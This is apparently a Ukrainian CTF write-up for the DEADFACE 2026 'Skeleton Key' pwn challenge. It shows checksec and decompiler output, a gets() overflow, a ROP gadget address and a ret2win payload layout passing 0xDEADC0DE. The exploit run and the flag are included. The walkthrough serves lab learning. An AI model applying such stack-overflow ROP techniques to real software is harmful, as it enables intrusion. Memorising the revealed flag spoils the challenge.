# PWN / Skeleton Key

**Прапор:** `deadface{R355UR3CT_D34D_C0D3}`

**Файли завдання:** архів з бінарником *(513 МБ)*

**Посилання на завантаженян архіву:** [Skeleton_Key.zip](https://deadface.sfo3.cdn.digitaloceanspaces.com/2026/challenges/pwn/Skeleton_Key.zip)

---

### Аналіз checksec
```sh
$ checksec Skeleton_Key 
[*] '/home/kali/deadface2026/Skeleton_Key/Skeleton_Key'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
Виявлено:
* Canary ***вимкнено***
* NX (No-Execute) ***ввімкнено***
* PIE (Position Independent Executable) ***вимкнено***

---

### Аналіз у декомпіляторі IDA
* #### Функція main():
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[64];

  setvbuf(_bss_start, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  print_art();
  printf("\n\n\n Well, deep in that old crypt, you found your key...");
  printf("...But do you know how to use it? ");
  printf("Let us see:  ");
  gets(v4);
  return 0;
}
```
Це вся доступна звичайному користовачу програма. Вона просто приймає ввід користувача (через вразливий метод gets).

Але в бінарнику ще є функція ***Wretched_Lock()***:
```c
void __fastcall Wretched_Lock(int a1)
{
  char v1;
  FILE *stream;

  if ( a1 == -559038242 )
  {
    stream = fopen("flag.txt", "r");
    if ( !stream )
      printf("[-] ERROR: a valid flag.txt could not be found!");
    while ( 1 )
    {
      v1 = fgetc(stream);
      if ( v1 == -1 )
        break;
      putchar(v1);
    }
  }
}
```
Вона має той самий функціонал, що і функція *nowhere* в [The Crypt](https://github.com/mald123/My-CTF-Writeups/tree/main/DEADFACE%20CTF%202026/PWN%20%7C%20The%20Crypt), але приймає і пепревіряє переданий їй атрибут: щоб він був рівний *-559038242* *(в шістнадцятковій - **0xDEADC0DE**)*.

---

### Створення експлойту

Маємо Ret2win через Buffer Overflow з передачею аргументу *0xDEADC0DE*. Щоб передати своє значення в перший аргумент, його треба помістити в регістр RDI перед зміною адреси повернення. Для того щоб зробити це, потрібно знайти адресу цього ROP-гаджету:
```sh
$ ROPgadget --binary ./Skeleton_Key | grep "pop rdi" 
0x0000000000401615 : pop rdi ; ret
```

Тепер не вистачає тільки адреси функції ***Wretched_Lock()***. Її можна визначити завдяки IDA, GDB або так:
```c
$ objdump -d Skeleton_Key | grep "<Wretched_Lock>"
0000000000401507 <Wretched_Lock>:
```

Тепер наш payload має такий вигляд: ***offset (64 + 8 bytes) -> "pop rdi ; ret" -> argument -> target function***

Запускаємо файл і отримуємо прапор:
```sh
$ python exploit.py
[+] Opening connection to 159.65.228.107 on port 5002: Done
[*] Switching to interactive mode
 deadface{R355UR3CT_D34D_C0D3}
[*] Got EOF while reading in interactive
$ 
```
